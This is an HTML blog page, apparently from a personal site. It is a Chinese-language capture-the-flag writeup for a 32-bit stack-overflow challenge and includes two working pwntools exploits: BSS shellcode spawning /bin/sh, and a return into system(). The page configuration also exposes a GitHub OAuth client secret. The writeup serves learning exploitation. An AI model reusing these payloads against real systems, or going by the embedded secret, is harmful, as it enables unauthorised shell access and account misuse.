@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.tkfun.site","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="description: hackme.inndy.tw toooomuch2 writeup 思路分析。 0x00 介绍这一题很简单的栈溢出PWN题。作为入门选手，做的过程也有点小波折。题目地址https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;，有时需要FQ。检查防护 1234567[*] &amp;#x27;&#x2F;home&#x2F;lin&#x2F;wdoc&#x2F;program-learn&#x2F;ctf_learn&#x2F;hackme.in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackme.inndy.tw toooomuch2 writeup">
+<meta property="og:url" content="https://blog.tkfun.site/2018/08/16/2018-8-wp1/index.html">
+<meta property="og:site_name" content="LinLin&#39;s blog">
+<meta property="og:description" content="description: hackme.inndy.tw toooomuch2 writeup 思路分析。 0x00 介绍这一题很简单的栈溢出PWN题。作为入门选手，做的过程也有点小波折。题目地址https:&#x2F;&#x2F;hackme.inndy.tw&#x2F;，有时需要FQ。检查防护 1234567[*] &amp;#x27;&#x2F;home&#x2F;lin&#x2F;wdoc&#x2F;program-learn&#x2F;ctf_learn&#x2F;hackme.in">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.tkfun.site/images/wp1-1.png">
+<meta property="article:published_time" content="2018-08-16T01:03:27.000Z">
+<meta property="article:modified_time" content="2024-11-15T11:58:41.867Z">
+<meta property="article:author" content="LinLin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.tkfun.site/images/wp1-1.png">
+
+
+<link rel="canonical" href="https://blog.tkfun.site/2018/08/16/2018-8-wp1/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://blog.tkfun.site/2018/08/16/2018-8-wp1/","path":"2018/08/16/2018-8-wp1/","title":"hackme.inndy.tw toooomuch2 writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>hackme.inndy.tw toooomuch2 writeup | LinLin's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">LinLin's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">0x00 介绍</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number"></span> <span class="nav-text">0x01 利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">0x02 总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">LinLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">38</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.tkfun.site/2018/08/16/2018-8-wp1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LinLin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LinLin's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="hackme.inndy.tw toooomuch2 writeup | LinLin's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hackme.inndy.tw toooomuch2 writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-08-16 09:03:27" itemprop="dateCreated datePublished" datetime="2018-08-16T09:03:27+08:00">2018-08-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-11-15 19:58:41" itemprop="dateModified" datetime="2024-11-15T19:58:41+08:00">2024-11-15</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>description: hackme.inndy.tw toooomuch2 writeup 思路分析。</p>
+<h2 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h2><p>这一题很简单的栈溢出PWN题。作为入门选手，做的过程也有点小波折。<br>题目地址<a target="_blank" rel="noopener" href="https://hackme.inndy.tw/">https://hackme.inndy.tw/</a>，有时需要FQ。<br>检查防护</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/lin/wdoc/program-learn/ctf_learn/hackme.inndy.tw/pwn/tooomuch2/toooomuch&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+<p>什么防护都没有。<br>拖到IDA里看下</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int toooomuch()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@2</span><br><span class="line">  char s; // [sp+0h] [bp-18h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Give me your passcode: &quot;);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  strcpy(passcode, &amp;s);</span><br><span class="line">  if ( check_passcode() )</span><br><span class="line">    result = play_a_game();</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;You are not allowed here!&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个是漏洞函数，可以看出漏洞输入点在gets(&amp;s)函数调用。gets用来读入一个字符串，没有限制输入长度。s是位于bp-18h的位置，bp后面是之前bp的位置，通过看反汇编代码，可以看到有一个设置临时栈的动作。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
+<p>栈如下：<br><img src="/images/wp1-1.png" alt="img"><br>当我们在输入时给s 018+8个a时，就能覆盖掉toooomuch函数的返回地址，此时会出现异常,core dump。</p>
+<h1 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h1><p>没有防护+溢出。这里的利用方法可能有很多种，网上看到是将shellcode放到bss段，然后利用溢出，中转到bss段去执行shellcode。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./toooomuch&#x27;)</span><br><span class="line">elf = ELF(&#x27;./toooomuch&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">gets_addr = p32(elf.symbols[&#x27;gets&#x27;])</span><br><span class="line">bss_addr = p32(elf.bss())</span><br><span class="line">payload = fit(&#123;0x18  + 0x4:[gets_addr, bss_addr, bss_addr]&#125;)</span><br><span class="line">p.sendlineafter(&#x27;your passcode: &#x27;, payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>执行流程是：</p>
+<ol>
+<li>tooomuch返回到gets上，将gets的返回地址设置为bss_addr，因为没有限制NX，所以BSS段也是可执行的</li>
+<li>然后在gets执行时，将shellcode输入，此时shellcode就位于BSS段起始位置。</li>
+<li>之后gets返回，执行shellcode。<br>出题人的提示是,也是用shellcode。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc hackme.inndy.tw 7702</span><br><span class="line">Get a shell, please.</span><br><span class="line">Tips: Buffer overflow, 0x8048560, shellcode</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>我自己的思路是利用代码中已经加载的system函数，调用它来获取shell。system需要一个输入&#x2F;bin&#x2F;sh字符串。通过gets时输入，整个利用exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./toooomuch&#x27;)</span><br><span class="line">elf = ELF(&#x27;./toooomuch&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = p32(elf.symbols[&#x27;system&#x27;])</span><br><span class="line">passcode = p32(elf.symbols[&#x27;passcode&#x27;])</span><br><span class="line">binsh = &#x27;/bin/sh &amp;&amp;&#x27;</span><br><span class="line">payload = binsh + (0x18 + 4- len(binsh) ) * &#x27;a&#x27; + system + passcode + passcode</span><br><span class="line">p.sendlineafter(&#x27;your passcode: &#x27;, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>之所以在&#x2F;bin&#x2F;sh后加了&amp;&amp;，是为了截断输入。否则system会把后面的输入当成是&#x2F;bin&#x2F;sh的参数，当成了一个命令调用。整个流程比shellcode要简单</p>
+<ol>
+<li>拼接payload, &#x2F;bin&#x2F;sh &amp;&amp; 加上一些填充字符’a’, 后面是调用地址 + 返回地址 + 参数地址。这里利用了代码中将输入复制到了passcode变量，所以使用passcode作为输入参数。</li>
+<li>输入payload</li>
+<li>返回到system，传入参数是passcode。</li>
+<li>get shell</li>
+</ol>
+<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><ol>
+<li>一开按照自己的思路填充栈时，没有考虑到设置临时栈时push ebp的动作，返回地址没有正确覆盖，一直没有成功，后来通过gdb调试才意识到。</li>
+<li>binsh的命令截断有很多姿势。&#x2F;bin&#x2F;sh;， 加分号也可以。</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018/08/14/2018-8-ctf-tools/" rel="prev" title="CTF PWN工具篇1-pwntools">
+                  <i class="fa fa-angle-left"></i> CTF PWN工具篇1-pwntools
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2018/08/19/2018-8-pwn-basic-knowlegeds/" rel="next" title="PWN基础知识总结">
+                  PWN基础知识总结 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">LinLin</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"linsite","repo":"blog","client_id":"c890ddee7bf63b258874","client_secret":"0569d1d63cbc2d139920a15bc963f2ec46371e22","admin_user":"linsite","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","id":"location.pathname","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"9c61170fcbdca7ff83ccb3540d012310"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
